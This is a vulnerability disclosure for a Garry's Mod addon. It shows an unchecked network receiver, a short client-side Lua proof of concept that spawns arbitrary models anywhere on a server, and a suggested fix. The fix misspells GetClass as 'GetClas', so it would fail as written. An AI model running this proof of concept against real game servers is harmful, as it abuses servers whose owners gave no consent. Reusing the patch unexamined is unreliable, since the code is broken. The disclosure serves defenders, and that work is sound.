# "Tool Pose Ragdoll" Net Exploit
Found by OverlordAkise on 2022.12.22  
Addon can be download from the workshop (id 2847143322)


The "Tool Pose Ragdoll" addon has a Net Exploit in the `SlashOursToolSpawn` net.Receive function.

### TL;DR
The addon doesn't verify anything in the specified net.Receive function.  
The net.Receive function takes a spawn position and model and simply spawns it where the player wants it to.  

### The Code
This is the Code that is responsible for the Exploit, found in the weapon's lua file:
```LUA 
if SERVER then
	util.AddNetworkString("SlashOursToolSpawn")

	net.Receive("SlashOursToolSpawn",function(lengh,ply)
		local ang = net.ReadAngle()
		local position = net.ReadVector()
		local model = net.ReadString()
		local sequence = net.ReadString()

		pose_createent=ents.Create("prop_dynamic")
		pose_createent:SetModel(model)
		pose_createent:SetPos(position)
		pose_createent:SetAngles(ang)
		pose_createent:PhysicsInitStatic(6)
		pose_createent:Spawn()
		pose_createent:Input("SetAnimation",nil,nil,sequence)
		undo.Create(model)
			undo.AddEntity(pose_createent)
			undo.SetPlayer(ply)
		undo.Finish()
	end)
end
```

### The Problem
The receiving function doesn't check if the player who sends this message is actually holding the toolgun or has permission to use it.  
This means that a player can send any data and the server will simply oblige.  


### Example Code
The easiest way to demonstrate this would be the following code:  
```LUA
net.Start("SlashOursToolSpawn")
    net.WriteAngle(Angle(0,0,0))
    net.WriteVector(LocalPlayer():GetEyeTrace().HitPos+Vector(0,0,20))
    net.WriteString("models/gman_high.mdl")
    net.WriteString("sitpose")
net.SendToServer()
```  
This spawns a sitting GMan at your current EyeTrace Hit-Position.  
You could also spawn this anywhere on the map and not only where the player is looking, because it takes a vector via `net.ReadVector` instead of getting the EyeTrace of the player serverside.  


### Fixing the exploit
It would be enough to check if the player who sent the net message has the toolgun in hand. This could be done like the following example, but a simple `if not ply:IsAdmin() then return end` would also be enough if players should never use this toolgun anyways.

Change the first lines of the net.Receive function to this:
```LUA
net.Receive("SlashOursToolSpawn", function(len, ply)
    local wep = ply:GetActiveWeapon()
    if not IsValid(wep) or wep:GetClas() ~= "gmod_tool" then return end
    --[ rest of the code ]--
    --...
```  
  
This doesn't fix the exploit if someone already has a toolgun, but on the servers I have been seeing this addon on (e.g. Star Wars themed) it doesn't matter because normal users never get a toolgun, which would make this a very easy and simple fix.  
